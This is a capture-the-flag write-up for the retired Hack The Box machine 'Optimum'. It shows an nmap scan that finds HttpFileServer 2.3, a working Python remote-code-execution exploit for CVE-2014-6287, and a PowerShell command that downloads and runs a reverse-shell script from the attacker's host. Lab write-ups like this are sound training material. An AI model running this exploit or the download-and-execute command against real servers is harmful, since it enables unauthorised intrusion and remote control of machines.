# Optimum (Retired)



## Recon


### nmap

```bash
(boolean㉿kalibox)[~/htb/optimum-pwnd]$ cat nmap/optimum-full.nmap 
# Nmap 7.91 scan initiated Mon Nov 23 20:52:21 2020 as: nmap -sC -sV -p- -oA nmap/optimum-full 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.030s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 23 20:54:12 2020 -- 1 IP address (1 host up) scanned in 111.17 seconds
```

### Webpage

![image-20210414225421233](/home/boolean/.config/Typora/typora-user-images/image-20210414225421233.png)

HttpFileServer seems to be the only entry point.



## Exploit

A single result is returned from searchsploit [CVE-2014-6287](https://www.exploit-db.com/exploits/39161).

```python
#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)

```





```bash
python3 Exploit.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24//invoke.ps1')"
```

